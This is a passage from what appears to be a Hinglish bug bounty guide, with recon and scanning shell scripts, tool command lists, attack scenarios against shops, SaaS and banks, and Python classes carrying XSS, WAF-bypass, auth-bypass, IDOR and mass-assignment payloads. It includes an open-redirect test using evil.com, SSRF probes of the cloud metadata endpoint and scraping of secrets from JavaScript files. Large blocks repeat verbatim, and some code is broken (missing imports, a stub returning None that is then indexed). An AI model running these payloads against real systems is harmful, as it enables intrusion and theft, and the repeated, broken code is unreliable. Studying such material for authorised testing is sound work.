cat recon/params.txt | qsreplace "https://evil.com" | httpx -fr -silent | grep evil.com > vulns/open_redirect.txt

# SSRF Testing
echo "[+] Testing for SSRF"
cat recon/params.txt | qsreplace "http://169.254.169.254/latest/meta-data/" | httpx -silent | grep -E "(instance-id|ami-id)" > vulns/ssrf.txt

# Phase 6: JavaScript Analysis
echo "[+] Phase 6: JavaScript Analysis"
cat recon/all_urls.txt | grep "\.js" | httpx -silent | tee recon/js_files.txt
cat recon/js_files.txt | xargs -n 1 -I % bash -c 'echo % && curl -s % | grep -E "(api_key|token|secret|bearer|Authorization|apikey)="' > vulns/js_secrets.txt

# Phase 7: Directory Fuzzing
echo "[+] Phase 7: Directory Fuzzing"
cat recon/alive_urls.txt | head -10 | xargs -n 1 -I % gobuster dir -u % -w ~/wordlists/common.txt -q -o vulns/dirs_%.txt

# Phase 8: Technology Detection
echo "[+] Phase 8: Technology Detection"
cat recon/alive_urls.txt | head -5 | xargs -n 1 whatweb > recon/tech_stack.txt

# Generate Report
echo "[+] Generating Report"
cat > reports/summary.txt << EOF
Bug Hunting Report for $domain
Generated on: $(date)

=== RECONNAISSANCE SUMMARY ===
Subdomains found: $(cat recon/subs.txt | wc -l)
Live hosts: $(cat recon/alive_urls.txt | wc -l)
URLs discovered: $(cat recon/all_urls.txt | wc -l)
Parameterized URLs: $(cat recon/params.txt | wc -l)
JavaScript files: $(cat recon/js_files.txt | wc -l)

=== VULNERABILITY SUMMARY ===
XSS findings: $(cat vulns/xss_results.txt 2>/dev/null | wc -l)
Open Redirects: $(cat vulns/open_redirect.txt 2>/dev/null | wc -l)
SSRF findings: $(cat vulns/ssrf.txt 2>/dev/null | wc -l)
JS Secrets: $(cat vulns/js_secrets.txt 2>/dev/null | wc -l)

=== NEXT STEPS ===
1. Manual verification of automated findings
2. Business logic testing
3. Authentication bypass testing
4. IDOR testing on discovered endpoints
5. Deep dive into interesting subdomains

EOF

echo "[+] Bug hunting completed! Check reports/summary.txt for overview"
echo "[+] All data saved in $domain/ directory"
```

#### Continuous Monitoring Script
```python
#!/usr/bin/env python3
"""
Continuous Bug Hunting Monitor
Monitors targets for new subdomains and vulnerabilities
"""

import subprocess
import time
import json
import smtplib
from email.mime.text import MIMEText
from datetime import datetime

class BugHuntMonitor:
    def __init__(self, targets_file, notification_email=None):
        self.targets_file = targets_file
        self.notification_email = notification_email
        self.previous_results = {}
        self.load_previous_results()
    
    def load_previous_results(self):
        """Load previous scan results"""
        try:
            with open('previous_results.json', 'r') as f:
                self.previous_results = json.load(f)
        except FileNotFoundError:
            self.previous_results = {}
    
    def save_results(self, results):
        """Save current results"""
        with open('previous_results.json', 'w') as f:
            json.dump(results, f, indent=2)
    
    def scan_target(self, domain):
        """Scan a single target"""
        print(f"[+] Scanning {domain}")
        
        # Subdomain discovery
        cmd = f"subfinder -d {domain} -all -silent"
        result = subprocess.run(cmd.split(), capture_output=True, text=True)
        subdomains = set(result.stdout.strip().split('\n'))
        
        # Live host detection
        live_hosts = set()
        for subdomain in subdomains:
            if subdomain:
                cmd = f"httpx -silent -status-code"
                process = subprocess.Popen(cmd.split(), stdin=subprocess.PIPE,
                                         stdout=subprocess.PIPE, text=True)
                output, _ = process.communicate(input=subdomain)
                if output.strip():
                    live_hosts.add(subdomain)
        
        return {
            'subdomains': subdomains,
            'live_hosts': live_hosts,
            'scan_time': datetime.now().isoformat()
        }
    
    def compare_results(self, domain, current_results):
        """Compare current results with previous scans"""
        # Implementation for comparison logic
        pass
    
    def send_notification(self, domain, changes):
        """Send email notification for changes"""
        if not self.notification_email or not any(changes.values()):
            return
        
        subject = f"New findings for {domain}"
        body = f"""
        New Bug Hunting Findings for {domain}
        
        New Subdomains ({len(changes['new_subdomains'])}):
        {chr(10).join(changes['new_subdomains'])}
        
        New Live Hosts ({len(changes['new_live_hosts'])}):
        {chr(10).join(changes['new_live_hosts'])}
        
        Scan Time: {datetime.now()}
        """
        
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = 'bugbounty@monitor.com'
        msg['To'] = self.notification_email
        
        # Configure SMTP settings
        try:
            server = smtplib.SMTP('localhost')
            server.send_message(msg)
            server.quit()
            print(f"[+] Notification sent for {domain}")
        except Exception as e:
            print(f"[-] Failed to send notification: {e}")
    
    def run_continuous_monitoring(self, interval_hours=24):
        """Run continuous monitoring"""
        with open(self.targets_file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
        
        while True:
            print(f"[+] Starting monitoring cycle at {datetime.now()}")
            current_results = {}
            
            for domain in targets:
                try:
                    results = self.scan_target(domain)
                    changes = self.compare_results(domain, results)
                    
                    if changes['new_subdomains'] or changes['new_live_hosts']:
                        print(f"[!] New findings for {domain}:")
                        print(f"    New subdomains: {len(changes['new_subdomains'])}")
                        print(f"    New live hosts: {len(changes['new_live_hosts'])}")
                        self.send_notification(domain, changes)
                    
                    current_results[domain] = {
                        'subdomains': list(results['subdomains']),
                        'live_hosts': list(results['live_hosts']),
                        'scan_time': results['scan_time']
                    }
                    
                except Exception as e:
                    print(f"[-] Error scanning {domain}: {e}")
            
            self.previous_results.update(current_results)
            self.save_results(self.previous_results)
            
            print(f"[+] Monitoring cycle completed. Sleeping for {interval_hours} hours...")
            time.sleep(interval_hours * 3600)

if __name__ == "__main__":
    monitor = BugHuntMonitor('targets.txt', 'your-email@example.com')
    monitor.run_continuous_monitoring(24)  # Check every 24 hours
```

### Advanced Checklist:
- [ ] 0-day vulnerabilities discover kar sakte ho
- [ ] Advanced attack vectors master ho
- [ ] Custom frameworks develop kar sakte ho
- [ ] Research papers publish kiye
- [ ] Conference presentations diye
- [ ] Industry recognition mila

---

## 🛠️ Tools Arsenal

### Reconnaissance Tools
```bash
# Subdomain Enumeration
subfinder, assetfinder, amass, findomain, chaos

# URL Discovery
katana, waybackurls, gau, hakrawler

# Port Scanning
nmap, masscan, rustscan

# Technology Detection
whatweb, wappalyzer, builtwith
```

### Vulnerability Scanners
```bash
# Web Application
burp suite, owasp zap, nikto, w3af

# Specific Vulnerabilities
dalfox (XSS), sqlmap (SQLi), commix (Command Injection)

# Network
nessus, openvas, nuclei
```

### Custom Scripts Location
```bash
~/bugbounty/tools/
├── recon.sh
├── vuln_scan.sh
├── js_analysis.py
├── subdomain_monitor.py
└── report_generator.py
```

### Complete Tools Arsenal (Enhanced)

#### Reconnaissance & OSINT
```bash
# Subdomain Discovery
subfinder -d target.com -all -silent
assetfinder --subs-only target.com
amass enum -passive -d target.com
findomain -t target.com -q
chaos -d target.com -key API_KEY

# DNS Tools
dnsrecon -d target.com -t std
fierce -dns target.com
dnscan -d target.com -w wordlist.txt

# Certificate Transparency
crt.sh, censys.io, shodan.io
certspotter -domain target.com

# Social Media & Email OSINT
sherlock username
theHarvester -d target.com -l 500 -b all
hunter.io, clearbit.com, pipl.com

# GitHub & Code Search
github-search.py -s "target.com"
truffleHog --regex --entropy=False target_repo
gitleaks --repo=target_repo

# Shodan & Internet Scanning
shodan search "ssl:target.com"
censys search "target.com"
zoomeye.org, fofa.so
```

#### Web Application Testing
```bash
# Directory & File Discovery
gobuster dir -u https://target.com -w wordlist.txt
dirsearch -u https://target.com -e php,html,js
ffuf -u https://target.com/FUZZ -w wordlist.txt

# Parameter Discovery
paramspider -d target.com
arjun -u https://target.com/page
x8 -u "https://target.com/page" -w wordlist.txt

# Content Discovery
waybackurls target.com
gau target.com
hakrawler -url https://target.com -depth 3

# Technology Stack Detection
whatweb target.com
wappalyzer target.com
builtwith.com
retire.js (for JS libraries)

# WAF Detection
wafw00f target.com
nmap --script http-waf-detect target.com
```

#### Vulnerability Scanners
```bash
# Web Application Scanners
burp suite professional
owasp zap
acunetix, netsparker
w3af -p scan_profile

# Specific Vulnerability Tools
# XSS
dalfox url https://target.com/page?param=value
xsser -u "https://target.com/page?param=value"
xsstrike -u https://target.com/page

# SQL Injection
sqlmap -u "https://target.com/page?id=1" --batch
jSQL injection tool
NoSQLMap (for NoSQL injection)

# SSRF
ssrfmap -r request.txt
gopherus (for SSRF exploitation)

# XXE
xxeinjector -r request.txt
oxml_xxe (for Office documents)

# Command Injection
commix -u "https://target.com/page?cmd=value"

# LDAP Injection
ldapdomaindump -u username -p password target.com

# Template Injection
tplmap -u "https://target.com/page?template=value"
```

#### Network & Infrastructure
```bash
# Port Scanning
nmap -sS -sV -O -A target.com
masscan -p1-65535 target.com --rate=1000
rustscan -a target.com -- -A

# Service Enumeration
nmap --script vuln target.com
nmap --script discovery target.com
enum4linux target.com (for SMB)

# SSL/TLS Testing
sslscan target.com
sslyze target.com
testssl.sh target.com

# Network Vulnerability Scanners
nessus, openvas, nexpose
nuclei -t nuclei-templates/ -u https://target.com
```

#### Mobile Application Testing
```bash
# Android
jadx app.apk (decompile)
apktool d app.apk (disassemble)
dex2jar app.apk (convert to jar)
mobsf (mobile security framework)

# iOS
class-dump binary
otool -L binary
hopper disassembler
frida (dynamic analysis)

# Static Analysis
semgrep --config=auto source_code/
bandit -r python_code/
brakeman rails_app/
```

#### Cloud Security Testing
```bash
# AWS
aws s3 ls s3://bucket-name --no-sign-request
aws iam get-account-authorization-details
pacu (AWS exploitation framework)
scout suite (multi-cloud auditing)

# Azure
az account list
az vm list
stormspotter (Azure red team tool)

# Google Cloud
gcloud projects list
gcloud compute instances list
gcpbucketbrute bucket_name
```

#### API Testing
```bash
# REST API
postman, insomnia
burp suite (with API testing extensions)
ffuf -u https://api.target.com/FUZZ -w api_wordlist.txt

# GraphQL
graphql-voyager (schema visualization)
graphiql (query interface)
graphql-cop (security scanner)

# API Discovery
kiterunner -A=apiroutes-210228 -t https://target.com
gobuster dir -u https://target.com/api -w api_wordlist.txt
```

### Real-World Scenarios & Case Studies

#### Scenario 1: E-commerce Application Testing
```bash
# Target: Online shopping platform
# Scope: *.shop.com

# Phase 1: Reconnaissance
subfinder -d shop.com -all -silent | tee subs.txt
cat subs.txt | httpx -silent -status-code -title | tee alive.txt

# Phase 2: Technology Detection
whatweb shop.com
# Result: WordPress, WooCommerce, MySQL

# Phase 3: Vulnerability Testing
# Business Logic: Price manipulation
# Original request: {"item_id": 123, "quantity": 1, "price": 100}
# Attack: {"item_id": 123, "quantity": -1, "price": 100}
# Result: Negative quantity gives money back

# IDOR Testing
# Original: /api/orders/12345 (your order)
# Attack: /api/orders/12346 (someone else's order)
# Result: Access to other users' orders

# Payment Bypass
# Normal flow: cart -> checkout -> payment -> success
# Attack: cart -> checkout -> success (skip payment)
# Result: Free items
```

#### Scenario 2: SaaS Platform Testing
```bash
# Target: Project management SaaS
# Scope: *.projectmanager.com

# Phase 1: Subdomain Discovery
amass enum -passive -d projectmanager.com | tee subs.txt
# Found: api.projectmanager.com, admin.projectmanager.com

# Phase 2: API Testing
# JWT Token Analysis
echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..." | base64 -d
# Found: {"user_id": 123, "role": "user", "exp": 1234567890}

# Privilege Escalation
# Change role from "user" to "admin" in JWT
# Result: Admin access to all projects

# Mass Assignment
# Original: {"name": "Project Name", "description": "Desc"}
# Attack: {"name": "Project Name", "description": "Desc", "owner_id": 1}
# Result: Change project ownership
```

#### Scenario 3: Banking Application Testing
```bash
# Target: Online banking platform
# Scope: *.bank.com (with explicit permission)

# Phase 1: Careful Reconnaissance
# Only passive techniques due to sensitive nature
curl -s "https://crt.sh/?q=bank.com&output=json" | jq -r '.[].name_value'

# Phase 2: Business Logic Testing
# Race Condition in Money Transfer
seq 1 10 | xargs -n1 -P10 -I{} curl -X POST "https://bank.com/transfer" \
  -d "from_account=123&to_account=456&amount=1000" \
  -H "Authorization: Bearer TOKEN"
# Result: Multiple transfers processed simultaneously

# Time-based Attacks
# Transfer $1000 at 23:59:59
# Cancel at 00:00:01 (next day)
# Result: Transfer processed but cancellation in new day fails
```

#### Scenario 4: IoT Device Testing
```bash
# Target: Smart home device
# IP: 192.168.1.100

# Phase 1: Network Discovery
nmap -sS -sV -O 192.168.1.100
# Found: Port 80 (HTTP), 22 (SSH), 23 (Telnet)

# Phase 2: Default Credentials
# Try: admin/admin, admin/password, root/root
telnet 192.168.1.100
# Success with admin/admin

# Phase 3: Firmware Analysis
binwalk firmware.bin
strings firmware.bin | grep -E "(password|key|secret)"
# Found hardcoded WiFi passwords and API keys

# Phase 4: Network Protocol Analysis
wireshark capture on device traffic
# Found: Unencrypted communication with cloud servers
```

### Advanced Testing Methodologies

#### Methodology 1: API Security Testing
```python
#!/usr/bin/env python3
"""
Comprehensive API Security Testing Framework
"""

class APISecurityTester:
    def __init__(self, base_url, auth_token=None):
        self.base_url = base_url
        self.auth_token = auth_token
        self.endpoints = []
        self.vulnerabilities = []
    
    def discover_endpoints(self):
        """Discover API endpoints"""
        # Check common API paths
        common_paths = [
            '/api/v1/', '/api/v2/', '/rest/', '/graphql',
            '/swagger.json', '/openapi.json', '/.well-known/'
        ]
        
        for path in common_paths:
            response = requests.get(f"{self.base_url}{path}")
            if response.status_code == 200:
                self.endpoints.append(path)
    
    def test_authentication_bypass(self):
        """Test for authentication bypass"""
        bypass_techniques = [
            {'header': 'X-Forwarded-For', 'value': '127.0.0.1'},
            {'header': 'X-Real-IP', 'value': '127.0.0.1'},
            {'header': 'X-Originating-IP', 'value': '127.0.0.1'},
            {'header': 'X-Remote-IP', 'value': '127.0.0.1'}
        ]
        
        for technique in bypass_techniques:
            headers = {technique['header']: technique['value']}
            response = requests.get(f"{self.base_url}/admin", headers=headers)
            if response.status_code == 200:
                self.vulnerabilities.append(f"Auth bypass via {technique['header']}")
    
    def test_idor(self):
        """Test for IDOR vulnerabilities"""
        # Test sequential IDs
        for user_id in range(1, 100):
            response = requests.get(
                f"{self.base_url}/api/users/{user_id}",
                headers={'Authorization': f'Bearer {self.auth_token}'}
            )
            if response.status_code == 200:
                # Check if we can access other users' data
                data = response.json()
                if data.get('user_id') != self.current_user_id:
                    self.vulnerabilities.append(f"IDOR at /api/users/{user_id}")
    
    def test_mass_assignment(self):
        """Test for mass assignment vulnerabilities"""
        # Try to add admin fields
        payload = {
            'name': 'Test User',
            'email': 'test@example.com',
            'role': 'admin',  # Attempt privilege escalation
            'is_admin': True,
            'permissions': ['read', 'write', 'delete']
        }
        
        response = requests.post(
            f"{self.base_url}/api/users",
            json=payload,
            headers={'Authorization': f'Bearer {self.auth_token}'}
        )
        
        if response.status_code == 201:
            user_data = response.json()
            if user_data.get('role') == 'admin':
                self.vulnerabilities.append("Mass assignment - privilege escalation")
```

#### Methodology 2: Business Logic Testing
```python
#!/usr/bin/env python3
"""
Business Logic Vulnerability Testing Framework
"""

class BusinessLogicTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.vulnerabilities = []
    
    def test_workflow_bypass(self):
        """Test workflow bypass vulnerabilities"""
        # Normal workflow: register -> verify -> activate
        # Try to skip verification step
        
        # Step 1: Register user
        register_data = {
            'username': 'testuser',
            'email': 'test@example.com',
            'password': 'password123'
        }
        register_response = self.session.post(f"{self.target_url}/register", data=register_data)
        
        # Step 2: Try to activate without verification
        if 'user_id' in register_response.text:
            user_id = self.extract_user_id(register_response.text)
            activate_response = self.session.get(f"{self.target_url}/activate/{user_id}")
            
            if activate_response.status_code == 200:
                self.vulnerabilities.append("Workflow bypass - email verification skipped")
    
    def test_race_conditions(self):
        """Test for race condition vulnerabilities"""
        # Test concurrent money transfers
        def transfer_money():
            return self.session.post(f"{self.target_url}/transfer", data={
                'from_account': '123',
                'to_account': '456',
                'amount': '1000'
            })
        
        # Execute multiple transfers simultaneously
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(transfer_money) for _ in range(10)]
            results = [future.result() for future in futures]
        
        # Check if multiple transfers were processed
        successful_transfers = sum(1 for r in results if r.status_code == 200)
        if successful_transfers > 1:
            self.vulnerabilities.append("Race condition in money transfer")
    
    def test_price_manipulation(self):
        """Test price manipulation vulnerabilities"""
        # Test negative prices
        negative_price_payload = {
            'item_id': '123',
            'quantity': '1',
            'price': '-100'
        }
        
        response = self.session.post(f"{self.target_url}/checkout", data=negative_price_payload)
        if 'success' in response.text.lower():
            self.vulnerabilities.append("Price manipulation - negative prices accepted")
        
        # Test zero prices
        zero_price_payload = {
            'item_id': '123',
            'quantity': '1',
            'price': '0'
        }
        
        response = self.session.post(f"{self.target_url}/checkout", data=zero_price_payload)
        if 'success' in response.text.lower():
            self.vulnerabilities.append("Price manipulation - zero prices accepted")
```

#### Methodology 3: Advanced XSS Testing
```python
#!/usr/bin/env python3
"""
Advanced XSS Testing with Context Awareness
"""

class AdvancedXSSTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.payloads = self.load_context_payloads()
        self.vulnerabilities = []
    
    def load_context_payloads(self):
        """Load context-specific XSS payloads"""
        return {
            'html_context': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '<iframe src="javascript:alert(\'XSS\')"></iframe>'
            ],
            'attribute_context': [
                '" onmouseover="alert(\'XSS\')" "',
                '\' onmouseover=\'alert("XSS")\' \'',
                'javascript:alert("XSS")',
                '" autofocus onfocus="alert(\'XSS\')" "'
            ],
            'javascript_context': [
                '\';alert("XSS");//',
                '\";alert("XSS");//',
                '</script><script>alert("XSS")</script>',
                'eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))'
            ],
            'css_context': [
                'expression(alert("XSS"))',
                'url("javascript:alert(\'XSS\')")',
                '/**/expression(alert("XSS"))',
                'behavior:url(#default#userData)'
            ]
        }
    
    def detect_context(self, response_text, payload):
        """Detect the context where payload is reflected"""
        if f'<script>{payload}</script>' in response_text:
            return 'html_context'
        elif f'value="{payload}"' in response_text:
            return 'attribute_context'
        elif f'var data = "{payload}";' in response_text:
            return 'javascript_context'
        elif f'color: {payload};' in response_text:
            return 'css_context'
        return 'unknown_context'
    
    def test_xss_with_context(self, parameter):
        """Test XSS with context-aware payloads"""
        # First, detect the context
        test_payload = "CONTEXT_TEST_12345"
        response = requests.get(f"{self.target_url}?{parameter}={test_payload}")
        context = self.detect_context(response.text, test_payload)
        
        # Use appropriate payloads for detected context
        if context in self.payloads:
            for payload in self.payloads[context]:
                test_response = requests.get(f"{self.target_url}?{parameter}={payload}")
                if self.is_xss_successful(test_response.text, payload):
                    self.vulnerabilities.append({
                        'type': 'XSS',
                        'context': context,
                        'parameter': parameter,
                        'payload': payload
                    })
    
    def test_waf_bypass(self, parameter):
        """Test WAF bypass techniques"""
        waf_bypass_payloads = [
            '<ScRiPt>alert("XSS")</ScRiPt>',  # Case variation
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))</script>',  # Encoding
            '<svg/onload=alert("XSS")>',  # Tag variation
            '<img src=x onerror=eval(atob("YWxlcnQoIlhTUyIp"))>',  # Base64 encoding
            '"><script>alert("XSS")</script>',  # Context breaking
            '<iframe srcdoc="<script>parent.alert(\'XSS\')</script>">',  # Iframe technique
        ]
        
        for payload in waf_bypass_payloads:
            response = requests.get(f"{self.target_url}?{parameter}={payload}")
            if self.is_xss_successful(response.text, payload):
                self.vulnerabilities.append({
                    'type': 'XSS_WAF_BYPASS',
                    'parameter': parameter,
                    'payload': payload
                })
```

### Practical Bug Hunting Scripts

#### Complete Automation Script
```bash
#!/bin/bash
# complete_bug_hunt.sh - Full automation script

domain=$1
if [ -z "$domain" ]; then
    echo "Usage: $0 domain.com"
    exit 1
fi

echo "[+] Starting comprehensive bug hunting for $domain"

# Create directory structure
mkdir -p $domain/{recon,vulns,reports}
cd $domain

# Phase 1: Subdomain Discovery
echo "[+] Phase 1: Subdomain Discovery"
subfinder -d $domain -all -silent | tee recon/subs.txt
assetfinder --subs-only $domain | anew recon/subs.txt
amass enum -passive -d $domain | anew recon/subs.txt
echo "[+] Found $(cat recon/subs.txt | wc -l) subdomains"

# Phase 2: Live Host Detection
echo "[+] Phase 2: Live Host Detection"
cat recon/subs.txt | httpx -silent -status-code -title | tee recon/alive.txt
cat recon/alive.txt | cut -d' ' -f1 > recon/alive_urls.txt
echo "[+] Found $(cat recon/alive_urls.txt | wc -l) live hosts"

# Phase 3: URL Discovery
echo "[+] Phase 3: URL Discovery"
cat recon/alive_urls.txt | waybackurls | anew recon/all_urls.txt
cat recon/alive_urls.txt | gau --blacklist png,jpg,gif,jpeg,swf,woff,svg,pdf | anew recon/all_urls.txt
cat recon/alive_urls.txt | katana -silent -d 3 | anew recon/all_urls.txt
echo "[+] Found $(cat recon/all_urls.txt | wc -l) URLs"

# Phase 4: Parameter Discovery
echo "[+] Phase 4: Parameter Discovery"
cat recon/all_urls.txt | grep "=" | anew recon/params.txt
echo "[+] Found $(cat recon/params.txt | wc -l) parameterized URLs"

# Phase 5: Vulnerability Testing
echo "[+] Phase 5: Vulnerability Testing"

# XSS Testing
echo "[+] Testing for XSS"
cat recon/params.txt | dalfox pipe --silence --no-spinner --skip-bav -o vulns/xss_results.txt

# SQL Injection Testing
echo "[+] Testing for SQL Injection"
sqlmap -m recon/params.txt --batch --level=2 --risk=2 --random-agent --output-dir=vulns/sqli/

# Open Redirect Testing
echo "[+] Testing for Open Redirect"
cat recon/params.txt | qsreplace "https://evil.com" | httpx -fr -silent | grep evil.com > vulns/open_redirect.txt

# SSRF Testing
echo "[+] Testing for SSRF"
cat recon/params.txt | qsreplace "http://169.254.169.254/latest/meta-data/" | httpx -silent | grep -E "(instance-id|ami-id)" > vulns/ssrf.txt

# Phase 6: JavaScript Analysis
echo "[+] Phase 6: JavaScript Analysis"
cat recon/all_urls.txt | grep "\.js" | httpx -silent | tee recon/js_files.txt
cat recon/js_files.txt | xargs -n 1 -I % bash -c 'echo % && curl -s % | grep -E "(api_key|token|secret|bearer|Authorization|apikey)="' > vulns/js_secrets.txt

# Phase 7: Directory Fuzzing
echo "[+] Phase 7: Directory Fuzzing"
cat recon/alive_urls.txt | head -10 | xargs -n 1 -I % gobuster dir -u % -w ~/wordlists/common.txt -q -o vulns/dirs_%.txt

# Phase 8: Technology Detection
echo "[+] Phase 8: Technology Detection"
cat recon/alive_urls.txt | head -5 | xargs -n 1 whatweb > recon/tech_stack.txt

# Generate Report
echo "[+] Generating Report"
cat > reports/summary.txt << EOF
Bug Hunting Report for $domain
Generated on: $(date)

=== RECONNAISSANCE SUMMARY ===
Subdomains found: $(cat recon/subs.txt | wc -l)
Live hosts: $(cat recon/alive_urls.txt | wc -l)
URLs discovered: $(cat recon/all_urls.txt | wc -l)
Parameterized URLs: $(cat recon/params.txt | wc -l)
JavaScript files: $(cat recon/js_files.txt | wc -l)

=== VULNERABILITY SUMMARY ===
XSS findings: $(cat vulns/xss_results.txt 2>/dev/null | wc -l)
Open Redirects: $(cat vulns/open_redirect.txt 2>/dev/null | wc -l)
SSRF findings: $(cat vulns/ssrf.txt 2>/dev/null | wc -l)
JS Secrets: $(cat vulns/js_secrets.txt 2>/dev/null | wc -l)

=== NEXT STEPS ===
1. Manual verification of automated findings
2. Business logic testing
3. Authentication bypass testing
4. IDOR testing on discovered endpoints
5. Deep dive into interesting subdomains

EOF

echo "[+] Bug hunting completed! Check reports/summary.txt for overview"
echo "[+] All data saved in $domain/ directory"
```

#### Continuous Monitoring Script
```python
#!/usr/bin/env python3
"""
Continuous Bug Hunting Monitor
Monitors targets for new subdomains and vulnerabilities
"""

import subprocess
import time
import json
import smtplib
from email.mime.text import MIMEText
from datetime import datetime

class BugHuntMonitor:
    def __init__(self, targets_file, notification_email=None):
        self.targets_file = targets_file
        self.notification_email = notification_email
        self.previous_results = {}
        self.load_previous_results()
    
    def load_previous_results(self):
        """Load previous scan results"""
        try:
            with open('previous_results.json', 'r') as f:
                self.previous_results = json.load(f)
        except FileNotFoundError:
            self.previous_results = {}
    
    def save_results(self, results):
        """Save current results"""
        with open('previous_results.json', 'w') as f:
            json.dump(results, f, indent=2)
    
    def scan_target(self, domain):
        """Scan a single target"""
        print(f"[+] Scanning {domain}")
        
        # Subdomain discovery
        cmd = f"subfinder -d {domain} -all -silent"
        result = subprocess.run(cmd.split(), capture_output=True, text=True)
        subdomains = set(result.stdout.strip().split('\n'))
        
        # Live host detection
        live_hosts = set()
        for subdomain in subdomains:
            if subdomain:
                cmd = f"httpx -silent -status-code"
                process = subprocess.Popen(cmd.split(), stdin=subprocess.PIPE,
                                         stdout=subprocess.PIPE, text=True)
                output, _ = process.communicate(input=subdomain)
                if output.strip():
                    live_hosts.add(subdomain)
        
        return {
            'subdomains': subdomains,
            'live_hosts': live_hosts,
            'scan_time': datetime.now().isoformat()
        }
    
    def compare_results(self, domain, current_results):
        """Compare current results with previous scans"""
        # Implementation for comparison logic
        pass
    
    def send_notification(self, domain, changes):
        """Send email notification for changes"""
        if not self.notification_email or not any(changes.values()):
            return
        
        subject = f"New findings for {domain}"
        body = f"""
        New Bug Hunting Findings for {domain}
        
        New Subdomains ({len(changes['new_subdomains'])}):
        {chr(10).join(changes['new_subdomains'])}
        
        New Live Hosts ({len(changes['new_live_hosts'])}):
        {chr(10).join(changes['new_live_hosts'])}
        
        Scan Time: {datetime.now()}
        """
        
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = 'bugbounty@monitor.com'
        msg['To'] = self.notification_email
        
        # Configure SMTP settings
        try:
            server = smtplib.SMTP('localhost')
            server.send_message(msg)
            server.quit()
            print(f"[+] Notification sent for {domain}")
        except Exception as e:
            print(f"[-] Failed to send notification: {e}")
    
    def run_continuous_monitoring(self, interval_hours=24):
        """Run continuous monitoring"""
        with open(self.targets_file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
        
        while True:
            print(f"[+] Starting monitoring cycle at {datetime.now()}")
            current_results = {}
            
            for domain in targets:
                try:
                    results = self.scan_target(domain)
                    changes = self.compare_results(domain, results)
                    
                    if changes['new_subdomains'] or changes['new_live_hosts']:
                        print(f"[!] New findings for {domain}:")
                        print(f"    New subdomains: {len(changes['new_subdomains'])}")
                        print(f"    New live hosts: {len(changes['new_live_hosts'])}")
                        self.send_notification(domain, changes)
                    
                    current_results[domain] = {
                        'subdomains': list(results['subdomains']),
                        'live_hosts': list(results['live_hosts']),
                        'scan_time': results['scan_time']
                    }
                    
                except Exception as e:
                    print(f"[-] Error scanning {domain}: {e}")
            
            self.previous_results.update(current_results)
            self.save_results(self.previous_results)
            
            print(f"[+] Monitoring cycle completed. Sleeping for {interval_hours} hours...")
            time.sleep(interval_hours * 3600)

if __name__ == "__main__":
    monitor = BugHuntMonitor('targets.txt', 'your-email@example.com')
    monitor.run_continuous_monitoring(24)  # Check every 24 hours
```

### Advanced Checklist:
- [ ] 0-day vulnerabilities discover kar sakte ho
- [ ] Advanced attack vectors master ho
- [ ] Custom frameworks develop kar sakte ho
- [ ] Research papers publish kiye
- [ ] Conference presentations diye
- [ ] Industry recognition mila

---

## 🛠️ Tools Arsenal

### Reconnaissance Tools
```bash
# Subdomain Enumeration
subfinder, assetfinder, amass, findomain, chaos

# URL Discovery
katana, waybackurls, gau, hakrawler

# Port Scanning
nmap, masscan, rustscan

# Technology Detection
whatweb, wappalyzer, builtwith
```

### Vulnerability Scanners
```bash
# Web Application
burp suite, owasp zap, nikto, w3af

# Specific Vulnerabilities
dalfox (XSS), sqlmap (SQLi), commix (Command Injection)

# Network
nessus, openvas, nuclei
```

### Custom Scripts Location
```bash
~/bugbounty/tools/
├── recon.sh
├── vuln_scan.sh
├── js_analysis.py
├── subdomain_monitor.py
└── report_generator.py
```

### Complete Tools Arsenal (Enhanced)

#### Reconnaissance & OSINT
```bash
# Subdomain Discovery
subfinder -d target.com -all -silent
assetfinder --subs-only target.com
amass enum -passive -d target.com
findomain -t target.com -q
chaos -d target.com -key API_KEY

# DNS Tools
dnsrecon -d target.com -t std
fierce -dns target.com
dnscan -d target.com -w wordlist.txt

# Certificate Transparency
crt.sh, censys.io, shodan.io
certspotter -domain target.com

# Social Media & Email OSINT
sherlock username
theHarvester -d target.com -l 500 -b all
hunter.io, clearbit.com, pipl.com

# GitHub & Code Search
github-search.py -s "target.com"
truffleHog --regex --entropy=False target_repo
gitleaks --repo=target_repo

# Shodan & Internet Scanning
shodan search "ssl:target.com"
censys search "target.com"
zoomeye.org, fofa.so
```

#### Web Application Testing
```bash
# Directory & File Discovery
gobuster dir -u https://target.com -w wordlist.txt
dirsearch -u https://target.com -e php,html,js
ffuf -u https://target.com/FUZZ -w wordlist.txt

# Parameter Discovery
paramspider -d target.com
arjun -u https://target.com/page
x8 -u "https://target.com/page" -w wordlist.txt

# Content Discovery
waybackurls target.com
gau target.com
hakrawler -url https://target.com -depth 3

# Technology Stack Detection
whatweb target.com
wappalyzer target.com
builtwith.com
retire.js (for JS libraries)

# WAF Detection
wafw00f target.com
nmap --script http-waf-detect target.com
```

#### Vulnerability Scanners
```bash
# Web Application Scanners
burp suite professional
owasp zap
acunetix, netsparker
w3af -p scan_profile

# Specific Vulnerability Tools
# XSS
dalfox url https://target.com/page?param=value
xsser -u "https://target.com/page?param=value"
xsstrike -u https://target.com/page

# SQL Injection
sqlmap -u "https://target.com/page?id=1" --batch
jSQL injection tool
NoSQLMap (for NoSQL injection)

# SSRF
ssrfmap -r request.txt
gopherus (for SSRF exploitation)

# XXE
xxeinjector -r request.txt
oxml_xxe (for Office documents)

# Command Injection
commix -u "https://target.com/page?cmd=value"

# LDAP Injection
ldapdomaindump -u username -p password target.com

# Template Injection
tplmap -u "https://target.com/page?template=value"
```

#### Network & Infrastructure
```bash
# Port Scanning
nmap -sS -sV -O -A target.com
masscan -p1-65535 target.com --rate=1000
rustscan -a target.com -- -A

# Service Enumeration
nmap --script vuln target.com
nmap --script discovery target.com
enum4linux target.com (for SMB)

# SSL/TLS Testing
sslscan target.com
sslyze target.com
testssl.sh target.com

